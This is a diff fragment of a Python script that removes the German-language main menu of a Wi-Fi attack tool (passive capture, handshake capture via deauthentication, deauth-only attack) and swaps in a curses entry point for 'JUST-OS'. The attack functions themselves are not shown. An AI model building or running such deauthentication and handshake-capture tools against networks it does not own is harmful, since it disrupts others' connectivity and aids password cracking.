-    print_networks(networks)
-    selected = select_network(networks)
-    
-    print("\n" + "="*60)
-    print("HAUPTMENÜ")
-    print("="*60)
-    print("1 = Passives Capture")
-    print("2 = Allgemeines Monitoring")
-    print("3 = Handshake mit Deauth (aktiv)")
-    print("4 = Nur Deauth-Angriff")
-    print("0 = Beenden")
-    
-    while True:
-        try:
-            choice = int(input("\nAuswahl: "))
-            if choice in [0,1,2,3,4]:
-                break
-        except:
-            pass
-    
-    cap_file = None
-    if choice == 1:
-        cap_file = passive_capture(mon_interface, selected)
-    elif choice == 2:
-        general_monitoring(mon_interface)
-    elif choice == 3:
-        cap_file = deauth_handshake(mon_interface, selected)
-    elif choice == 4:
-        only_deauth(mon_interface, selected)
-    elif choice == 0:
-        pass
-    
-    if cap_file:
-        print(f"\nFinale Capture-Datei: {cap_file}")
-    
-    restore(interface, mon_interface)
-    log("Skript erfolgreich beendet")
-    print("\nTool sauber beendet. Nur auf eigenen Netzwerken verwenden!")
-    print(f"Logdatei: {LOGFILE}")
+    try: curses.wrapper(main)
+    except KeyboardInterrupt: pass
+    finally: save_data(); print("\n[!] JUST-OS beendet.")
